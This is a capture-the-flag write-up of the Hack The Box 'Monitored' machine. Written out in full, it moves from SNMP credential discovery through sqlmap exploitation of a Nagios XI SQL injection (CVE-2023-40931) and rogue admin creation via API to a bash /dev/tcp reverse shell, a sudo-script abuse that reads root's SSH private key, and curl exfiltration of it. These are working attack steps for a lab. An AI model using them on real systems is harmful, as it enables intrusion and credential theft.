---
title:  "HTB Monitored Writeup"
date:   2024-05-11 00:30:00 
categories: HTB Machine
tags: CVE-2023-40931 SQLI  nagios Script_abuse SNMP
---

![Monitored](/assets/img/Monitored/GDkfNA1asAAJz8P.png)

## Introduction 

Monitored was quite and interesting machine and it had a very clear theme throughout the user and root. I got to give the creator respect for sticking to the same theme being services related to nagios. The user access was at times a little frustrating due to the limited quality documentation of nagios (Or i just didnt'find it). Root was quite a fun challenge figuring out which script was exploitable


If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.129.239.6
```
**Nmap**
```
# Nmap 7.94 scan initiated Mon Jan 15 15:36:05 2024 as: nmap -sS -A -p- -o nmap 10.129.239.6
Nmap scan report for 10.129.239.6
Host is up (0.053s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Debian)
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
5667/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/15%OT=22%CT=1%CU=39672%PV=Y%DS=2%DC=T%G=Y%TM=65A5976
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=106%GCD=2%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M542ST11NW7%O2=M542ST11
OS:NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54
OS:2NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   99.12 ms 10.10.16.1
2   25.63 ms 10.129.239.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 15 15:36:48 2024 -- 1 IP address (1 host up) scanned in 43.97 seconds
```

When reviewing the Nmap output we can see that a few ports were found to be open. The web ports **80** and **443** which when looking at them redirected the user to the subdomain **https://nagios.monitored.htb/**. When checking these out we could see that it was the landing page of a Nagios service. Nagios is a very handy software to monitor IT assets, This is probably why the box's name is Monitored. When looking at the Ldap service (389). i was unable to get any interesting information out of this. The application on port **5667** was giving me no info either 

![Monitored](/assets/img/Monitored/Monitored_01.png)

So At this point my only lead was that it was Nagios was my only lead so i started searching deeper to maybe find a hint towards what the next step might be. After reading up on this more closely i noticed that Nagios often uses the SNMP protocol. This protocol is often accessible using the default community strings and can contain interesting information. So first i'd check if SNMP is open by running the following nmap commmand.

```bash
sudo nmap -o nmap_udp -sU 10.129.239.6
```
```
# Nmap 7.94 scan initiated Mon Jan 15 16:05:42 2024 as: nmap -o nmap_udp -sU 10.129.239.6
Nmap scan report for monitored.htb (10.129.239.6)
Host is up (0.026s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
123/udp open          ntp
161/udp open          snmp
162/udp open|filtered snmptrap

# Nmap done at Mon Jan 15 16:22:31 2024 -- 1 IP address (1 host up) scanned in 1009.51 seconds
```

Here we could see that Nmap was indeed enabled. next step is to dump all information from the SNMP using the snmp walk command. I push all the info to a file because SNMP often contains so much info it wouldn't fit on the screen fully.

```bash
snmpwalk -v2c -c public nagios.monitored.htb > snmpwalk
```

Reading through the output of snmpwalk we could find some very interesting start up commands.Here we see it runs some script with what seems like a username and password being **svc** and password **XjH7VCehowpR1xZB**

```bash
so.3.6.1.2.1.25.4.2.1.5.546 = ""
iso.3.6.1.2.1.25.4.2.1.5.547 = STRING: "-u -s -O /run/wpa_supplicant"
iso.3.6.1.2.1.25.4.2.1.5.556 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.575 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
iso.3.6.1.2.1.25.4.2.1.5.638 = STRING: "-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
iso.3.6.1.2.1.25.4.2.1.5.727 = STRING: "-f /usr/local/nagios/etc/pnp/npcd.cfg"
iso.3.6.1.2.1.25.4.2.1.5.733 = STRING: "-LOw -f -p /run/snmptrapd.pid"
iso.3.6.1.2.1.25.4.2.1.5.745 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.755 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.765 = STRING: "-p /var/run/ntpd.pid -g -u 108:116"
```
### Exploiting SVC account

So now have a username and a password but no clue yet where this could be used. When trying to authenticate to the nagiosxi portal this didn't work. Neither did ldap nor SSH. When looking further into Nagios i stumbled upon the backend ticket authentication method which is seperate from the portal.[A support ticket](https://support.nagios.com/forum/viewtopic.php?f=16&t=58783) detailed how someone was struggling to get the authentication to work. Basically this told me that auth tokens were a thing and you could obtain em using the following code examples.

```
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=TOKEN' > image.png
```

So changing these example requests to fit our needs we'd get the following curl command to obtain a code.

```bash
curl -POST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=1000' --proxy "http://127.0.0.1:8080"
```

![Token Acquired](/assets/img/Monitored/Monitored_02.png)

So now that we have a working token i performed the command the code example gave to test if it actually generated a working auth token. It generated an image with trends information so this token was working perfectly fine.

```bash
curl -k -L 'https://nagios.monitored.htb/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=3e73f4036a0980775226614e410cec93b0c3b86e' > image.png
```

![Token Acquired](/assets/img/Monitored/image.png)


So next step was to see what other pages would work using this token. It seems i was over complicating everything, just adding this token to index page  was enough to get access to the login portal. In the homepage we can see that version **5.11.0** of Nagios XI was being used. This version was found vulnerable to a SQL injection vulnerability.by messing with the ID paramter in the **/nagiosxi/admin/banner_message-ajaxhelper.php**. For more information on this exploit check the CVE [**CVE-2023-40931**](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)

```
https://nagios.monitored.htb/nagiosxi/index.php?&token=5e548a6ccf82f8c4e3b08e531b3193a31ebb9136
```

![Nagios XI version dislosed](/assets/img/Monitored/Monitored_03.png)


### SQL injection

So now that we know that there is supposed to be an SQL injection vulnerability within the **banner_message-ajaxhelper.php** file we can try to exploit this using sqlmap. So for each of these requests we need to fetch a new token if it isn't valid anymore. This token we have to fill in as well ad the id parameter. Then using SQLmap we tell it to specifically target this parameter.

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?id=1&token=d49fbfbd777098d47c48dd42b18755aa76c19553" -p id --proxy=http://127.0.0.1:8080 --dbs
```

This gives us the following output saying there were only two databases here.

![Databases disclosed](/assets/img/Monitored/Monitored_04.png)



So the next step would be to check what tables are present within this database.

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1&token=0c9e269703f86ad38766a7c282272de56787ea99" -p id --proxy=http://127.0.0.1:8080 --batch  --tables -D nagiosxi
```
Here we can see that there are a lot of tables however the most interesting of them all was the user table. The next step would be to extract the data of all users.

![Tables ](/assets/img/Monitored/Monitored_05.png)

With the following command its possible to acquire all the users on the application using the following command. Here we could see there were only two users but whats interesting is that there is an **API key for all users**

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1&token=042b5f8597666a7d80766e2fa62fc3dcb5813876" -p id --proxy=http://127.0.0.1:8080 --batch  --dump -T xi_users -D nagiosxi
```

![Users ](/assets/img/Monitored/Monitored_06.png)

CSV file for ease of use

```csv
user_id,email,name,api_key,enabled,password,username,created_by,last_login,api_enabled,last_edited,created_time,last_attempt,backend_ticket,last_edited_by,login_attempts,last_password_change
1,admin@monitored.htb,Nagios Administrator,IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL,1,$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C,nagiosadmin,0,1701931372,1,1701427555,0,0,IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0,5,0,1701427555
2,svc@monitored.htb,svc,2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK,0,$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK,svc,1,1699724476,1,1699728200,1699634403,1705351454,6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq,1,5,1699697433
```

### Creating new nagios user

So now that extracted the users table gave us some information on the admin user. The API key looks very interesting but we can't use this to log in directly, However if we call the api  we would still be able to do whatever we want with administrative permissions. my next guess was then to add a new user which we control the password of. When searching for this i ran into a [support ticket](https://support.nagios.com/forum/viewtopic.php?f=16&t=42923) that disclosed the API request used for adding a new user.

```bash
curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&pretty=1" -d "username=jmcdouglas&password=test&name=Jordan%20McDouglas&email=jmcdouglas@localhost"
```

Now we modify this request with our API key and username we want to create. Do note we need to add the **auth_level=admin** parameter otherwise this user won't have administrative access 

```bash
curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=Calico1&password=Calico&name=Calico&email=Calico@localhost&auth_level=admin" --proxy "http://127.0.0.1:8080" --insecure
```

The server then issued the following response showing us that the user has been created successfully

```
{
    "success": "User account calico1 was added successfully!",
    "user_id": 7
}
```

So when we tried to log into the application with our new credentials they would work. First it would ask you to change your password but after doing this we'd be greeted with the homepage as admin. Looking through the many settings nagios contained i found the **core config manager** in the **Configure** tab on the left. or can be found on the following url.

```
https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php
```

![Core config manager](/assets/img/Monitored/Monitored_07.png)


This page contained a button called commands. These are commands that can be ran on the different hosts connected to nagios. So we went here and tried to create our own new command by pressing the new button up top.


![Create command](/assets/img/Monitored/Monitored_08.png)


next we fill in a reverse shell like the following into the new command. Then click on save, On the following page you need to press **apply configuration**  

```bash
bash -c '/bin/bash -l > /dev/tcp/10.10.16.40/443 0<&1 2>&1'
```

![Create command 2 ](/assets/img/Monitored/Monitored_09.png)


So now this command exists in the system so we can use it. When going to the hosts page  (can be found on the left tab). we can select the Localhost to enter a info page of this host. Here we could select the command we created earlier. next step is to then run the command

![Run command](/assets/img/Monitored/Monitored_10.png)

Then a moment later we'd get a reverse shell as the user nagios

![User shell](/assets/img/Monitored/Monitored_11.png)


## Privilege escalation

For a better user experience i first ran the following python command to make the shell a little bit more stable

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then the first command i ran was sudo -l to see what this user is allowed to run as root. looking at the output it was quite a lot of commands and scripts. the commands don't look like they could be exploited however the scripts might contain some way to elevate ourselves to root.

```bash
sudo -l
```

![Sudo -l ](/assets/img/Monitored/Monitored_12.png)


When looking deeper into the **/usr/local/nagiosxi/scripts/components/getprofile.sh** script we can see that the nagios_log_file is being grabbed from the file **/usr/local/nagios/etc/nagios.cfg**. When looking at this file we can see that our user has write permissions on this file.

```bash
echo "Creating nagios.txt..."
nagios_log_file=$(cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^log_file=//p' | sed 's/\r$//')
tail -n500 "$nagios_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/nagios.txt"
```

We can check our file permissions on the nagios.cfg file using ls 

```bash
ls -hal /usr/local/nagios/etc/nagios.cfg
```

![User permissions](/assets/img/Monitored/Monitored_13.png)

So first up lets check what this file contains before we modify it by using cat. Most of the file has been snipped for brevity. Here we can see that the original value of the log file is **/usr/local/nagios/var/nagios.log**

```
<snipped>
lock_file=/var/run/nagios.lock
log_archive_path=/usr/local/nagios/var/archives
log_external_commands=0
log_file=/usr/local/nagios/var/nagios.log
log_host_retries=1
log_initial_states=0

<snipped>
```

So knowing the format of the previous file path we can replace it using the following sed command. this command will then change the log file to the private key of the root user.

```bash
sed -i 's#/usr/local/nagios/var/nagios.log#/root/.ssh/id_rsa#g' /usr/local/nagios/etc/nagios.cfg
```

So next up we need to run the script with sudo like so:

```bash
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
```

![Sudo command](/assets/img/Monitored/Monitored_14.png)

So after executing this script it would dump the profile.zip in the **/usr/local/nagiosxi/var/components/** directory. So now we want to exfiltrate this file. i decided to do this by using a python upload server.

```bash
python3 -m uploadserver 80 
```

Then run the following curl command on the target to upload the zip file

```bash
curl -X POST http://10.10.16.40/upload -F files=@/usr/local/nagiosxi/var/components/profile.zip
```

Then a moment later we'd receive the file on our upload server

![Zip exfiltrated](/assets/img/Monitored/Monitored_15.png)


Now we can unzip this file with the following command:

```
unzip profile.zip
```

![Root access](/assets/img/Monitored/Monitored_16.png)

Then when digging into the file structure we can see that **./profile-1705446030/nagios-logs/** directory contains the **nagios.txt** file. This is the file we replaced with the private key of the root user. To use this  key we need to first fix its permissions like so:

```bash
chmod 600 nagios.txt
```

Then we can use this file to authenticate as root to the machine

```bash
ssh -i ./nagios.txt root@monitor.htb
```

![Root access](/assets/img/Monitored/Monitored_17.png)



## Appendix 
### Full getprofile.sh

```bash
#!/bin/bash

# GRAB THE ID
folder=$1
if [ "$folder" == "" ]; then
    echo "You must enter a folder name/id to generate a profile."
    echo "Example: ./getprofile.sh <id>"
    exit 1
fi

# Clean the folder name
folder=$(echo "$folder" | sed -e 's/[^[:alnum:]|-]//g')

# Get OS & version
if which lsb_release &>/dev/null; then
    distro=`lsb_release -si`
    version=`lsb_release -sr`
elif [ -r /etc/redhat-release ]; then

    if rpm -q centos-release; then
        distro=CentOS
    elif rpm -q sl-release; then
        distro=Scientific
    elif [ -r /etc/oracle-release ]; then
        distro=OracleServer
    elif rpm -q cloudlinux-release; then
        distro=CloudLinux
    elif rpm -q fedora-release; then
        distro=Fedora
    elif rpm -q redhat-release || rpm -q redhat-release-server; then
        distro=RedHatEnterpriseServer
    fi >/dev/null

    version=`sed 's/.*release \([0-9.]\+\).*/\1/' /etc/redhat-release`
else
    # Release is not RedHat or CentOS, let's start by checking for SuSE
    # or we can just make the last-ditch effort to find out the OS by sourcing os-release if it exists
    if [ -r /etc/os-release ]; then
        source /etc/os-release
        if [ -n "$NAME" ]; then
            distro=$NAME
            version=$VERSION_ID
        fi
    fi
fi

ver="${version%%.*}"

# Make a clean folder (but save profile.html)
rm -rf "/usr/local/nagiosxi/var/components/profile/$folder/"
mkdir "/usr/local/nagiosxi/var/components/profile/$folder/"
mv -f "/usr/local/nagiosxi/tmp/profile-$folder.html" "/usr/local/nagiosxi/var/components/profile/$folder/profile.html"

# Create the folder setup
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs"
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/logs"
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/versions"

echo "-------------------Fetching Information-------------------"
echo "Please wait......."

echo "Creating system information..."
echo "$distro" > "/usr/local/nagiosxi/var/components/profile/$folder/hostinfo.txt"
echo "$version" >> "/usr/local/nagiosxi/var/components/profile/$folder/hostinfo.txt"

echo "Creating nagios.txt..."
nagios_log_file=$(cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^log_file=//p' | sed 's/\r$//')
tail -n500 "$nagios_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/nagios.txt"

echo "Creating perfdata.txt..."
perfdata_log_file=$(cat /usr/local/nagios/etc/pnp/process_perfdata.cfg | sed -n -e 's/^LOG_FILE = //p')
tail -n500 "$perfdata_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdata.txt"

echo "Creating npcd.txt..."
npcd_log_file=$(cat /usr/local/nagios/etc/pnp/npcd.cfg | sed -n -e 's/^log_file = //p')
tail -n500 "$npcd_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/npcd.txt"

echo "Creating cmdsubsys.txt..."
tail -n500 /usr/local/nagiosxi/var/cmdsubsys.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/cmdsubsys.txt"

echo "Creating event_handler.txt..."
tail -n500 /usr/local/nagiosxi/var/event_handler.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/event_handler.txt"

echo "Creating eventman.txt..."
tail -n500 /usr/local/nagiosxi/var/eventman.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/eventman.txt"

echo "Creating perfdataproc.txt..."
tail -n500 /usr/local/nagiosxi/var/perfdataproc.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdataproc.txt"

echo "Creating sysstat.txt..."
tail -n500 /usr/local/nagiosxi/var/sysstat.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/sysstat.txt"

echo "Creating systemlog.txt..."
if [ -f /var/log/messages ]; then
    /usr/bin/tail -n1000 /var/log/messages > "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
elif [ -f /var/log/syslog ]; then
    /usr/bin/tail -n1000 /var/log/syslog > "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
fi

echo "Retrieving all snmp logs..."
if [ -f /var/log/snmptrapd.log ]; then
    /usr/bin/tail -n1000 /var/log/snmptrapd.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptrapd.txt"
fi
if [ -f /var/log/snmptt/snmptt.log ]; then
    /usr/bin/tail -n1000 /var/log/snmptt/snmptt.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptt.txt"
fi
if [ -f /var/log/snmptt/snmpttsystem.log ]; then
    /usr/bin/tail -n1000 /var/log/snmptt/snmpttsystem.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttsystem.txt"
fi
if [ -f /var/log/snmpttunknown.log ]; then
    /usr/bin/tail -n1000 /var/log/snmpttunknown.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttunknown.log.txt"
fi

echo "Creating apacheerrors.txt..."
if [ -d /var/log/httpd ]; then
    for a in $(ls /var/log/httpd)
        do
            /usr/bin/tail -n1000 /var/log/httpd/$a > "/usr/local/nagiosxi/var/components/profile/$folder/logs/$a.txt"
        done

elif [ -d /var/log/apache2 ]; then
    for a in $(ls /var/log/apache2)
        do
            /usr/bin/tail -n1000 /var/log/apache2/$a > "/usr/local/nagiosxi/var/components/profile/$folder/logs/$a.txt"
        done
fi

echo "Creating mysqllog.txt..."

# Determine if MySQL or MariaDB is localhost
db_host=$(
    php -r '
        define("CFG_ONLY", 1);
        require_once($argv[1]);
        print(@$cfg["db_info"]["ndoutils"]["dbserver"] . "\n");
    ' \
        '/usr/local/nagiosxi/html/config.inc.php' 2>/dev/null |
    tail -1
)
echo "The database host is $db_host" > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_host.txt"
if [ "$db_host" == "localhost" ]; then

    if [ -f /var/log/mysqld.log ]; then
        /usr/bin/tail -n500 /var/log/mysqld.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_log.txt"
    elif [ -f /var/log/mariadb/mariadb.log ]; then
        /usr/bin/tail -n500 /var/log/mariadb/mariadb.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_log.txt"
    elif [ -f /var/log/mysql/mysql.log ]; then
        /usr/bin/tail -n500 /var/log/mysql/mysql.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_log.txt"       
    fi

    # Check if we are running with postgresql
    $(grep -q pgsql /usr/local/nagiosxi/html/config.inc.php)

    if [ $? -eq 0 ]; then

        echo "Getting xi_users..."
        echo 'select * from xi_users;' | psql nagiosxi nagiosxi > "/usr/local/nagiosxi/var/components/profile/$folder/xi_users.txt"

        echo "Getting xi_usermeta..."
        echo 'select * from xi_usermeta;' | psql nagiosxi nagiosxi > "/usr/local/nagiosxi/var/components/profile/$folder/xi_usermeta.txt"

        echo "Getting xi_options(mail)..."
        echo 'select * from xi_options;' | psql nagiosxi nagiosxi | grep mail > "/usr/local/nagiosxi/var/components/profile/$folder/xi_options_mail.txt"

        echo "Getting xi_otions(smtp)..."
        echo 'select * from xi_options;' | psql nagiosxi nagiosxi | grep smtp > "/usr/local/nagiosxi/var/components/profile/$folder/xi_options_smtp.txt"

    else

        echo "Getting xi_users..."
        echo 'select * from xi_users;' | mysql -u root -pnagiosxi nagiosxi -t > "/usr/local/nagiosxi/var/components/profile/$folder/xi_users.txt"

        echo "Getting xi_usermeta..."
        echo 'select * from xi_usermeta;' | mysql -u root -pnagiosxi nagiosxi -t > "/usr/local/nagiosxi/var/components/profile/$folder/xi_usermeta.txt"

        echo "Getting xi_options(mail)..."
        echo 'select * from xi_options;' | mysql -t -u root -pnagiosxi nagiosxi | grep mail > "/usr/local/nagiosxi/var/components/profile/$folder/xi_options_mail.txt"

        echo "Getting xi_otions(smtp)..."
        echo 'select * from xi_options;' | mysql -t -u root -pnagiosxi nagiosxi | grep smtp > "/usr/local/nagiosxi/var/components/profile/$folder/xi_options_smtp.txt"

    fi

    if which mysqladmin >/dev/null 2>&1; then
        errlog=$(mysqladmin -u root -pnagiosxi variables | grep log_error)
        if [ $? -eq 0 ] && [ -f "$errlog" ]; then
            /usr/bin/tail -n500 "$errlog" > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
        fi
    fi

    # Do manual check also, just in case we didn't get a log
    if [ -f /var/log/mysql.err ]; then
        /usr/bin/tail -n500 /var/log/mysql.err > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
    elif [ -f /var/log/mysql/error.log ]; then
        /usr/bin/tail -n500 /var/log/mysql/error.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
    elif [ -f /var/log/mariadb/error.log ]; then
        /usr/bin/tail -n500 /var/log/mariadb/error.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
    fi
fi

echo "Creating a sanatized copy of config.inc.php..."
cp /usr/local/nagiosxi/html/config.inc.php "/usr/local/nagiosxi/var/components/profile/$folder/config.inc.php"
sed -i '/pwd/d' "/usr/local/nagiosxi/var/components/profile/$folder/config.inc.php"
sed -i '/password/d' "/usr/local/nagiosxi/var/components/profile/$folder/config.inc.php"

echo "Creating memorybyprocess.txt..."
ps aux --sort -rss > "/usr/local/nagiosxi/var/components/profile/$folder/memorybyprocess.txt"

echo "Creating filesystem.txt..."
df -h > "/usr/local/nagiosxi/var/components/profile/$folder/filesystem.txt"
echo "" >> "/usr/local/nagiosxi/var/components/profile/$folder/filesystem.txt"
df -i >> "/usr/local/nagiosxi/var/components/profile/$folder/filesystem.txt"

echo "Dumping PS - AEF to psaef.txt..."
ps -aef > "/usr/local/nagiosxi/var/components/profile/$folder/psaef.txt"

echo "Creating top log..."
top -b -n 1 > "/usr/local/nagiosxi/var/components/profile/$folder/top.txt"

echo "Creating sar log..."
sar 1 5 > "/usr/local/nagiosxi/var/components/profile/$folder/sar.txt"

FILE=$(ls /usr/local/nagiosxi/nom/checkpoints/nagioscore/ | sort -n -t _ -k 2 | grep .gz | tail -1) 
cp "/usr/local/nagiosxi/nom/checkpoints/nagioscore/$FILE" "/usr/local/nagiosxi/var/components/profile/$folder/"

echo "Copying objects.cache..."
objects_cache_file=$(cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^object_cache_file=//p' | tr -d '\r')
cp "$objects_cache_file" "/usr/local/nagiosxi/var/components/profile/$folder/"

echo "Copying MRTG Configs..."
tar -pczf "/usr/local/nagiosxi/var/components/profile/$folder/mrtg.tar.gz" /etc/mrtg/

echo "Counting Performance Data Files..."

spool_perfdata_location=$(cat /usr/local/nagios/etc/pnp/npcd.cfg | sed -n -e 's/^perfdata_spool_dir = //p')
echo "Total files in $spool_perfdata_location" > "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
ls -al "$spool_perfdata_location" | wc -l >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
echo "" >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"

spool_xidpe_location=$(cat /usr/local/nagios/etc/commands.cfg | sed -n -e 's/\$TIMET\$.perfdata.host//p' | sed -n -e 's/\s*command_line\s*\/bin\/mv\s//p' | sed -n -e 's/.*\s//p')
echo "Total files in $spool_xidpe_location" >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
ls -al "$spool_xidpe_location" | wc -l >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
echo "" >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"

echo "Counting MRTG Files..."
echo "Total files in /etc/mrtg/conf.d/" >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
ls -al /etc/mrtg/conf.d/ | wc -l >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
echo "" >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"

echo "Total files in /var/lib/mrtg/" >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
ls -al /var/lib/mrtg/ | wc -l >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"
echo "" >> "/usr/local/nagiosxi/var/components/profile/$folder/file_counts.txt"

echo "Getting Network Information..."
ip addr > "/usr/local/nagiosxi/var/components/profile/$folder/ip_addr.txt"

echo "Getting CPU info..."
cat /proc/cpuinfo > "/usr/local/nagiosxi/var/components/profile/$folder/cpuinfo.txt"

echo "Getting memory info..."
free -m > "/usr/local/nagiosxi/var/components/profile/$folder/meminfo.txt"

echo "Getting ipcs Information..."
ipcs > "/usr/local/nagiosxi/var/components/profile/$folder/ipcs.txt"

echo "Getting SSH terminal / shellinabox yum info..."
if [ `command -v yum` ]; then
    yum info shellinabox > "/usr/local/nagiosxi/var/components/profile/$folder/versions/shellinabox.txt"
else
    apt-cache show shellinabox > "/usr/local/nagiosxi/var/components/profile/$folder/versions/shellinabox.txt"
fi

echo "Getting Nagios Core version..."
/usr/local/nagios/bin/nagios --version > "/usr/local/nagiosxi/var/components/profile/$folder/versions/nagios.txt"

echo "Getting NPCD version..."
/usr/local/nagios/bin/npcd --version > "/usr/local/nagiosxi/var/components/profile/$folder/versions/npcd.txt"

echo "Getting NRPE version..."
/usr/local/nagios/bin/nrpe --version > "/usr/local/nagiosxi/var/components/profile/$folder/versions/nrpe.txt"

echo "Getting NSCA version..."
/usr/local/nagios/bin/nsca --version > "/usr/local/nagiosxi/var/components/profile/$folder/versions/nsca.txt"

echo "Getting NagVis version..."
grep -i const_version /usr/local/nagvis/share/server/core/defines/global.php > "/usr/local/nagiosxi/var/components/profile/$folder/versions/nagvis.txt"

echo "Getting WKTMLTOPDF version..."
/usr/bin/wkhtmltopdf --version > "/usr/local/nagiosxi/var/components/profile/$folder/versions/wkhtmltopdf.txt"

echo "Getting Nagios-Plugins version..."
